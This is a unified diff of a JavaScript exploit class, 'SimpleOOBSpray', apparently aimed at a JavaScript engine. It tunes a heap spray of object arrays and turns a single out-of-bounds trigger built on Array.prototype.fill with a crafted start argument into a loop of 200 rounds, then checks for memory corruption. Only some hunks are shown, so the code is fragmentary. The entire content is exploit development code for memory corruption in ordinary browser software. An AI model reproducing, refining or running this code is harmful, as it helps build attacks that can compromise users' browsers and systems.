@@ -8,12 +8,12 @@ class SimpleOOBSpray {
 
     async execute() {
         await this.sprayArrays();
-        await this.triggerOOB(); 
+        await this.multipleOOB();
         await this.checkCorruption();
     }
 
     async sprayArrays() {
-        for (let i = 0; i < 100000; i++) {
+        for (let i = 0; i < 1000; i++) {
             const arr = new Array(100);
             for (let j = 0; j < arr.length; j++) {
                 arr[j] = {
@@ -27,9 +27,16 @@ class SimpleOOBSpray {
         log("Sprayed " + this.spray.length + " arrays");
     }
 
-    async triggerOOB() {
+    async multipleOOB() {
+        for (let round = 0; round < 200; round++) {
+            await this.triggerOOB(round);
+            await sleep(5);
+        }
+    }
+
+    async triggerOOB(round) {
         const v0 = [];
-        for (let i = 0; i < 10000; i++) {
+        for (let i = 0; i < 100000; i++) {
             v0[i] = [];
         }
         
@@ -44,7 +51,8 @@ class SimpleOOBSpray {
             }
         };
         
-        v0.fill({oob: true}, o14);
+        v0.fill({oob: true, round: round}, o14);
+        log("OOB round " + round + " completed");
     }
 
     async checkCorruption() {
